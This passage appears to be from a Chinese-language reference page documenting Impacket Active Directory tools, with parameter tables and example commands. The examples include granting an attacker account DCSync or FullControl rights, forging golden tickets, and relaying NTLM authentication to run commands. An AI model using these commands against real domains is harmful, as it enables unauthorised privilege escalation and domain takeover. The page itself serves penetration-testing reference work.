+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py domain/username:password -target target_user -action read</span><br><span class="line">python dacledit.py domain/username:password -target target_user -principal attacker_user -action write -rights FullControl</span><br><span class="line">python dacledit.py domain/username:password -target-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1000</span> -principal-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1001</span> -action write -rights DCSync</span><br><span class="line">python dacledit.py domain/username:password -target target_user -principal attacker_user -action remove -rights ResetPassword</span><br><span class="line">python dacledit.py domain/username:password -target target_user -action backup -file backup.json</span><br></pre></td></tr></table></figure>
+
+<h3 id="owneredit-py"><a href="#owneredit-py" class="headerlink" title="owneredit.py"></a>owneredit.py</h3><p><strong>功能</strong>: 所有者权限编辑工具<br><strong>用途</strong>: 读取和修改 Active Directory 对象的 Owner 属性 (OwnerSid)</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>identity</code></td>
+<td>域身份，格式为 <code>domain.local/username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-use-ldaps</code></td>
+<td>使用 LDAPS 而不是 LDAP</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-action [{read,write}]</code></td>
+<td>对所有者属性执行的操作（默认：read）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>域控制器的主机名</td>
+</tr>
+</tbody></table>
+<p><strong>所有者参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-new-owner NAME</code></td>
+<td>新所有者的 sAMAccountName</td>
+</tr>
+<tr>
+<td><code>-new-owner-sid SID</code></td>
+<td>新所有者的安全标识符</td>
+</tr>
+<tr>
+<td><code>-new-owner-dn DN</code></td>
+<td>新所有者的可分辨名称</td>
+</tr>
+</tbody></table>
+<p><strong>目标参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target NAME</code></td>
+<td>目标对象的 sAMAccountName</td>
+</tr>
+<tr>
+<td><code>-target-sid SID</code></td>
+<td>目标对象的安全标识符</td>
+</tr>
+<tr>
+<td><code>-target-dn DN</code></td>
+<td>目标对象的可分辨名称</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python owneredit.py domain/username:password -target target_user -action read</span><br><span class="line">python owneredit.py domain/username:password -target target_user -new-owner attacker_user -action write</span><br><span class="line">python owneredit.py -use-ldaps domain/username:password -target-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1234567890</span>-<span class="number">1000</span> -action read</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberos-票据工具"><a href="#Kerberos-票据工具" class="headerlink" title="Kerberos 票据工具"></a>Kerberos 票据工具</h2><h3 id="getTGT-py"><a href="#getTGT-py" class="headerlink" title="getTGT.py"></a>getTGT.py</h3><p><strong>功能</strong>: 获取 Kerberos TGT 票据<br><strong>用途</strong>: 获取 Kerberos 门票授予票据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>identity</code></td>
+<td>用户身份信息，格式为 <code>[domain/]username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN）</td>
+</tr>
+</tbody></table>
+<p><strong>服务参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-service SPN</code></td>
+<td>通过 AS-REQ 直接请求服务票据</td>
+</tr>
+<tr>
+<td><code>-principalType [PRINCIPALTYPE]</code></td>
+<td>令牌的主体类型，可以是 NT_UNKNOWN、NT_PRINCIPAL、NT_SRV_INST 等，默认为 NT_PRINCIPAL</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python getTGT.py domain/username:password</span><br><span class="line">python getTGT.py -hashes :nthash domain/username</span><br><span class="line">python getTGT.py -k domain/username</span><br><span class="line">python getTGT.py -aesKey hex_key domain/username</span><br></pre></td></tr></table></figure>
+
+<h3 id="getST-py"><a href="#getST-py" class="headerlink" title="getST.py"></a>getST.py</h3><p><strong>功能</strong>: 获取 Kerberos ST 票据<br><strong>用途</strong>: 获取 Kerberos 服务票据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>identity</code></td>
+<td>用户身份信息，格式为 <code>[domain/]username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-spn SPN</code></td>
+<td>目标服务的 SPN（service&#x2F;server）</td>
+</tr>
+<tr>
+<td><code>-altservice ALTSERVICE</code></td>
+<td>在票据中设置新的 sname&#x2F;SPN</td>
+</tr>
+<tr>
+<td><code>-dmsa</code></td>
+<td>使用 DMSA（委托托管服务账户）</td>
+</tr>
+<tr>
+<td><code>-impersonate IMPERSONATE</code></td>
+<td>要模拟的目标用户名（通过 S4U2Self）</td>
+</tr>
+<tr>
+<td><code>-additional-ticket ticket.ccache</code></td>
+<td>请求 RBCD + KCD Kerberos</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-u2u</code></td>
+<td>请求用户到用户票据</td>
+</tr>
+<tr>
+<td><code>-self</code></td>
+<td>仅执行 S4U2self，不执行 S4U2proxy</td>
+</tr>
+<tr>
+<td><code>-force-forwardable</code></td>
+<td>强制通过 S4U2Self 获取的服务票据可转发</td>
+</tr>
+<tr>
+<td><code>-renew</code></td>
+<td>设置 RENEW 票据选项以续期用于身份验证的 TGT</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py domain/username:password -spn <span class="string">&quot;service/spn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ticketer-py"><a href="#ticketer-py" class="headerlink" title="ticketer.py"></a>ticketer.py</h3><p><strong>功能</strong>: 生成 Kerberos 票据<br><strong>用途</strong>: 创建伪造的 Kerberos 票据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>新创建票据的用户名</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-spn SPN</code></td>
+<td>目标服务的 SPN（service&#x2F;server），如果省略则创建黄金票据</td>
+</tr>
+<tr>
+<td><code>-request</code></td>
+<td>向域请求票据并克隆，仅更改提供的信息，需要指定 -user</td>
+</tr>
+<tr>
+<td><code>-domain DOMAIN</code></td>
+<td>完全限定域名（例如 contoso.com）</td>
+</tr>
+<tr>
+<td><code>-domain-sid DOMAIN_SID</code></td>
+<td>目标域的域 SID</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于签署票据的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-nthash NTHASH</code></td>
+<td>用于签署票据的 NT 哈希</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥（仅银票据）</td>
+</tr>
+<tr>
+<td><code>-groups GROUPS</code></td>
+<td>要包含在票据 PAC 中的组列表（默认 &#x3D; 513, 512, 520, 518, 519）</td>
+</tr>
+<tr>
+<td><code>-user-id USER_ID</code></td>
+<td>创建票据的用户 ID（默认 &#x3D; 500）</td>
+</tr>
+<tr>
+<td><code>-extra-sid EXTRA_SID</code></td>
+<td>要包含在票据 PAC 中的 ExtraSids 逗号分隔列表</td>
+</tr>
+<tr>
+<td><code>-extra-pac</code></td>
+<td>用额外的 PAC（UPN_DNS）填充票据</td>
+</tr>
+<tr>
+<td><code>-old-pac</code></td>
+<td>使用旧的 PAC 结构创建票据</td>
+</tr>
+<tr>
+<td><code>-duration DURATION</code></td>
+<td>票据过期前的小时数（默认 &#x3D; 24<em>365</em>10）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-impersonate IMPERSONATE</code></td>
+<td>Sapphire 票据，将被模拟的目标用户名</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-user USER</code></td>
+<td>如果选择 -request，则使用的 domain&#x2F;username</td>
+</tr>
+<tr>
+<td><code>-password PASSWORD</code></td>
+<td>domain&#x2F;username 的密码</td>
+</tr>
+<tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -nthash <span class="built_in">hash</span> -domain-sid SID -domain domain.com user</span><br><span class="line">python ticketer.py -aesKey hex_key -domain-sid SID -domain domain.com -spn cifs/server user</span><br><span class="line">python ticketer.py -request -user domain/admin -password password -domain-sid SID -domain domain.com user</span><br></pre></td></tr></table></figure>
+
+<h3 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h3><p><strong>功能</strong>: Golden Ticket 攻击工具<br><strong>用途</strong>: 执行黄金票据攻击</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName&gt;</code></td>
+</tr>
+<tr>
+<td><code>command</code></td>
+<td>在目标上执行的命令（或 -c 使用时的参数），默认为 cmd.exe，’None’ 将不执行 PSEXEC</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-c pathname</code></td>
+<td>上传文件名供以后执行，参数通过 command 选项传递</td>
+</tr>
+<tr>
+<td><code>-w pathname</code></td>
+<td>将黄金票据以 CCache 格式写入 <code>&lt;pathname&gt;</code> 文件</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址（获取用户 SID 所需）</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>要攻击的目标主机的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python goldenPac.py domain/user@target_ip -hashes <span class="built_in">hash</span></span><br><span class="line">python goldenPac.py domain/user:password@target_ip -w ticket.ccache</span><br><span class="line">python goldenPac.py domain/user@target_ip <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ticketConverter-py"><a href="#ticketConverter-py" class="headerlink" title="ticketConverter.py"></a>ticketConverter.py</h3><p><strong>功能</strong>: 票据格式转换工具<br><strong>用途</strong>: 转换不同格式的 Kerberos 票据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>input_file</code></td>
+<td>kirbi（KRB-CRED）或 ccache 格式的文件</td>
+</tr>
+<tr>
+<td><code>output_file</code></td>
+<td>输出文件</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python ticketConverter.py ticket.kirbi ticket.ccache</span><br><span class="line">python ticketConverter.py ticket.ccache ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<h3 id="describeTicket-py"><a href="#describeTicket-py" class="headerlink" title="describeTicket.py"></a>describeTicket.py</h3><p><strong>功能</strong>: 描述票据内容<br><strong>用途</strong>: 分析 Kerberos 票据的详细信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ticket</code></td>
+<td>ticket.ccache 文件路径</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>票据解密凭证</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p PASSWORD, --password PASSWORD</code></td>
+<td>服务账户的明文密码</td>
+</tr>
+<tr>
+<td><code>-hp HEXPASSWORD, --hex-password HEXPASSWORD</code></td>
+<td>服务账户的十六进制密码</td>
+</tr>
+<tr>
+<td><code>-u USER, --user USER</code></td>
+<td>服务账户的名称</td>
+</tr>
+<tr>
+<td><code>-d DOMAIN, --domain DOMAIN</code></td>
+<td>FQDN 域名</td>
+</tr>
+<tr>
+<td><code>-s SALT, --salt SALT</code></td>
+<td>密钥计算的盐值</td>
+</tr>
+<tr>
+<td><code>--rc4 RC4</code></td>
+<td>RC4 密钥（即 NT 哈希）</td>
+</tr>
+<tr>
+<td><code>--aes HEXKEY</code></td>
+<td>AES128 或 AES256 密钥</td>
+</tr>
+</tbody></table>
+<p><strong>PAC 凭证解密材料</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--asrep-key HEXKEY</code></td>
+<td>PAC 凭证解密的 AS 回复密钥</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python describeTicket.py ticket.kirbi</span><br><span class="line">python describeTicket.py ticket.ccache -p password -u service_account -d domain.com</span><br><span class="line">python describeTicket.py ticket.kirbi --rc4 nthash</span><br></pre></td></tr></table></figure>
+
+<h3 id="getPac-py"><a href="#getPac-py" class="headerlink" title="getPac.py"></a>getPac.py</h3><p><strong>功能</strong>: 获取 PAC（Privilege Attribute Certificate）<br><strong>用途</strong>: 提取 PAC 信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>credentials</code></td>
+<td>域凭据，格式为 <code>domain/username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-targetUser TARGETUSER</code></td>
+<td>要检索 PAC 的目标用户</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python getPac.py domain/username:password -targetUser Administrator</span><br><span class="line">python getPac.py domain/username -targetUser Administrator -hashes :nthash</span><br></pre></td></tr></table></figure>
+
+<h3 id="kintercept-py"><a href="#kintercept-py" class="headerlink" title="kintercept.py"></a>kintercept.py</h3><p><strong>功能</strong>: Kerberos 拦截工具<br><strong>用途</strong>: 拦截和分析 Kerberos 流量</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>server</code></td>
+<td>目标服务器地址</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>--server-port SERVER_PORT</code></td>
+<td>目标服务器端口</td>
+</tr>
+<tr>
+<td><code>--listen-port LISTEN_PORT</code></td>
+<td>监听端口</td>
+</tr>
+<tr>
+<td><code>--listen-addr LISTEN_ADDR</code></td>
+<td>监听地址</td>
+</tr>
+<tr>
+<td><code>--request-handler HANDLER:ARG</code></td>
+<td>请求处理器，示例：s4u2else:user</td>
+</tr>
+<tr>
+<td><code>--reply-handler HANDLER:ARG</code></td>
+<td>回复处理器，示例：tgs-rep-user:user</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python kintercept.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span><br><span class="line">python kintercept.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> --listen-port <span class="number">8888</span> --request-handler s4u2else:Administrator</span><br><span class="line">python kintercept.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> --server-port <span class="number">88</span> --listen-addr <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="网络攻击工具"><a href="#网络攻击工具" class="headerlink" title="网络攻击工具"></a>网络攻击工具</h2><h3 id="ntlmrelayx-py"><a href="#ntlmrelayx-py" class="headerlink" title="ntlmrelayx.py"></a>ntlmrelayx.py</h3><p><strong>功能</strong>: NTLM 中继攻击工具<br><strong>用途</strong>: 执行 NTLM 身份验证中继攻击</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>目标参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t TARGET, --target TARGET</code></td>
+<td>中继目标，格式为 <code>[scheme://]target[:port]</code>，例如 <code>smb://192.168.1.100:445</code></td>
+</tr>
+<tr>
+<td><code>-tf TARGETFILE, --target-file TARGETFILE</code></td>
+<td>包含目标列表的文件</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-smb-port SMB_PORT</code></td>
+<td>SMB 服务器端口（默认：445）</td>
+</tr>
+<tr>
+<td><code>-http-port HTTP_PORT</code></td>
+<td>HTTP 服务器端口（默认：80）</td>
+</tr>
+<tr>
+<td><code>-socks-port SOCKS_PORT</code></td>
+<td>SOCKS 代理端口（默认：1080）</td>
+</tr>
+<tr>
+<td><code>-socks-address SOCKS_ADDRESS</code></td>
+<td>SOCKS 代理地址（默认：0.0.0.0）</td>
+</tr>
+<tr>
+<td><code>-l LOOTDIR, --lootdir LOOTDIR</code></td>
+<td>存放收集到的信息的目录（默认：当前目录）</td>
+</tr>
+<tr>
+<td><code>-of OUTPUT_FILE, --output-file OUTPUT_FILE</code></td>
+<td>加密哈希的输出文件名</td>
+</tr>
+<tr>
+<td><code>-dh, --dump-hashes</code></td>
+<td>在控制台显示加密哈希</td>
+</tr>
+<tr>
+<td><code>-codec CODEC</code></td>
+<td>设置目标输出使用的编码（默认：ascii）</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>SMB2 支持</td>
+</tr>
+<tr>
+<td><code>-ntlmchallenge NTLMCHALLENGE</code></td>
+<td>指定 SMB 服务器使用的 NTLM 挑战（16 个十六进制字节）</td>
+</tr>
+<tr>
+<td><code>-socks</code></td>
+<td>启动 SOCKS 代理用于中继连接</td>
+</tr>
+<tr>
+<td><code>-wh WPAD_HOST, --wpad-host WPAD_HOST</code></td>
+<td>启用 WPAD 文件服务用于代理身份验证攻击</td>
+</tr>
+<tr>
+<td><code>-wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM</code></td>
+<td>在提供 WPAD 文件之前提示客户端进行身份验证的次数（默认：1）</td>
+</tr>
+<tr>
+<td><code>-6, --ipv6</code></td>
+<td>在 IPv6 上监听</td>
+</tr>
+<tr>
+<td><code>--remove-mic</code></td>
+<td>移除 MIC（利用 CVE-2019-1040）</td>
+</tr>
+<tr>
+<td><code>--serve-image SERVE_IMAGE</code></td>
+<td>将返回给客户端的图像的本地路径</td>
+</tr>
+<tr>
+<td><code>-c COMMAND</code></td>
+<td>在目标系统上执行的命令（适用于 SMB 和 RPC）</td>
+</tr>
+</tbody></table>
+<p><strong>服务器选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--no-smb-server</code></td>
+<td>禁用 SMB 服务器</td>
+</tr>
+<tr>
+<td><code>--no-http-server</code></td>
+<td>禁用 HTTP 服务器</td>
+</tr>
+<tr>
+<td><code>--no-wcf-server</code></td>
+<td>禁用 WCF 服务器</td>
+</tr>
+<tr>
+<td><code>--no-raw-server</code></td>
+<td>禁用 RAW 服务器</td>
+</tr>
+<tr>
+<td><code>--no-rpc-server</code></td>
+<td>禁用 RPC 服务器</td>
+</tr>
+<tr>
+<td><code>--no-winrm-server</code></td>
+<td>禁用 WinRM 服务器</td>
+</tr>
+</tbody></table>
+<p><strong>SMB 客户端选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-e FILE</code></td>
+<td>在目标系统上执行的文件</td>
+</tr>
+<tr>
+<td><code>--enum-local-admins</code></td>
+<td>如果中继用户不是管理员，尝试 SAMR 查找查看谁是管理员（仅适用于 Win 10 Anniversary 之前）</td>
+</tr>
+<tr>
+<td><code>--rpc-attack {None,TSCH,ICPR}</code></td>
+<td>选择通过命名管道上的 RPC 执行的攻击</td>
+</tr>
+</tbody></table>
+<p><strong>RPC 客户端选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-rpc-mode {TSCH,ICPR}</code></td>
+<td>要攻击的协议</td>
+</tr>
+<tr>
+<td><code>-rpc-use-smb</code></td>
+<td>将 DCE&#x2F;RPC 中继到 SMB 管道</td>
+</tr>
+<tr>
+<td><code>-auth-smb [domain/]username[:password]</code></td>
+<td>使用此凭据对 SMB 进行身份验证（低权限账户）</td>
+</tr>
+<tr>
